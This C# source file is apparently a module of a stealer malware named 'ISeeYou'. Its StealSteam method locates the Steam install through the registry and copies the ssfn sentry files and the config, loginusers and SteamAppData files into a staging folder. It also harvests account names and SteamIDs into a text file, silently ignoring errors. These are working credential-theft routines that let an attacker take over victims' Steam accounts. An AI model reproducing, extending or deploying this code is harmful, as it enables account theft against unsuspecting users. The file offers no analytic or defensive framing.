using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace ISeeYou
{
    class Steam
    {
        private static string SteamDir;
        public static List<string> Files = new List<string>();

        public static void StealSteam(string path)
        {
            Directory.CreateDirectory(path + "\\Steam");
            GetSteamDir();
            GetFiles(path + "\\Steam\\");
            for (int i = 0; i < Files.Count; i++)
            {
                try
                {
                    FileInfo fi = new FileInfo(Files[i]);
                    File.Copy(Files[i], path + "\\Steam\\" + fi.Name);
                }
                catch (Exception)
                {
                    continue;
                }
            }
        }
        private static void GetSteamDir()
        {
            try
            {
                RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Wow6432Node\\Valve\\Steam");
                SteamDir = registryKey.GetValue("InstallPath").ToString();
            }
            catch (NullReferenceException)
            {
                SteamDir = "";
            }
        }
        private static void GetFiles(string path)
        {
            try
            {
                if (SteamDir != "")
                {
                    string[] array = Directory.GetFiles(SteamDir, "ssfn*");
                    for (int i = 0; i < array.Length; i++)
                    {
                        string text = array[i];
                        if (new FileInfo(text).Length == 2048L)
                        {
                            Files.Add(text);
                        }
                    }
                    string[] array2 = new string[]
					{
						"\\config\\config.vdf",
						"\\config\\loginusers.vdf",
						"\\config\\SteamAppData.vdf"
					};
                    array = array2;
                    for (int i = 0; i < array.Length; i++)
                    {
                        string str = array[i];
                        Files.Add(SteamDir + str);
                    }
                    GetSteamUrls(path);
                }
            }
            catch
            {
            }
        }
        private static void GetSteamUrls(string pathSave)
        {
            try
            {
                string path = SteamDir + "\\config\\config.vdf";
                string text = pathSave + "\\steamids.txt";
                string[] value = File.ReadAllLines(path);
                Regex regex = new Regex("\"\\w+?\",\t\t\t\t\t{,\t\t\t\t\t\t\"SteamID\"\t\t\"\\d{17}\",\t\t\t\t\t},");
                string separator = ",";
                string input = string.Join(separator, value);
                MatchCollection matchCollection = regex.Matches(input);
                for (int i = 0; i < matchCollection.Count; i++)
                {
                    File.AppendAllText(text, Substrings(matchCollection[i].Value, "\"", "\",\t\t\t\t\t{,", 0, StringComparison.Ordinal)[0] + " | http://steamcommunity.com/profiles/" + Substrings(matchCollection[i].Value, "\"SteamID\"\t\t\"", "\",", 0, StringComparison.Ordinal)[0] + Environment.NewLine);
                }
            }
            catch
            {
            }
        }
        private static string[] Substrings(string str, string left, string right, int startIndex, StringComparison comparsion)
        {
            string[] result;
            if (string.IsNullOrEmpty(str))
            {
                result = new string[0];
            }
            else
            {
                if (left == null)
                {
                    throw new ArgumentNullException("left");
                }
                if (left.Length == 0)
                {
                    throw new ArgumentNullException("left");
                }
                if (right == null)
                {
                    throw new ArgumentNullException("right");
                }
                if (right.Length == 0)
                {
                    throw new Exception("right");
                }
                if (startIndex < 0)
                {
                    throw new Exception("startIndex");
                }
                if (startIndex >= str.Length)
                {
                    throw new ArgumentOutOfRangeException("startIndex");
                }
                int startIndex2 = startIndex;
                List<string> list = new List<string>();
                while (true)
                {
                    int num = str.IndexOf(left, startIndex2, comparsion);
                    if (num == -1)
                    {
                        break;
                    }
                    int num2 = num + left.Length;
                    int num3 = str.IndexOf(right, num2, comparsion);
                    if (num3 == -1)
                    {
                        break;
                    }
                    int length = num3 - num2;
                    list.Add(str.Substring(num2, length));
                    startIndex2 = num3 + right.Length;
                }
                result = list.ToArray();
            }
            return result;
        }
    }
}
